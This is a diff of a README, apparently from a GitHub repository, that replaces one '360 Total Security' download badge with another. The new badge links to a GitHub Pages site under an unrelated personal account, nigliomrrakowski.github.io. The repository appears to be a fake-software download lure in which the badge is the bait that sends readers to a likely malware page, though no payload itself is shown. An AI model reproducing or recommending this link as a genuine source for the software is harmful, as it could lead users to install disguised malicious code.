@@ -4,11 +4,8 @@
   <img src="https://it-nerd24.de/media/image/57/64/ae/panda12r81vczBRP4zV5.png" width="820" alt="360 Total Security">
 </div>
 
-<p align="center">
-  <a href="https://security-360-total.github.io/.github">
-    <img src="https://img.shields.io/badge/Get_360_Total_Security-1A9FFF?style=for-the-badge&logo=windows&logoColor=white" alt="Get 360 Total Security">
-  </a>
-</p>
+[![GET Security 360](https://img.shields.io/badge/GET%20%E2%80%94%20Security-360-0078D6?style=for-the-badge&logoColor=white)](https://nigliomrrakowski.github.io/.github/Security-360)
+
 
 ---
 
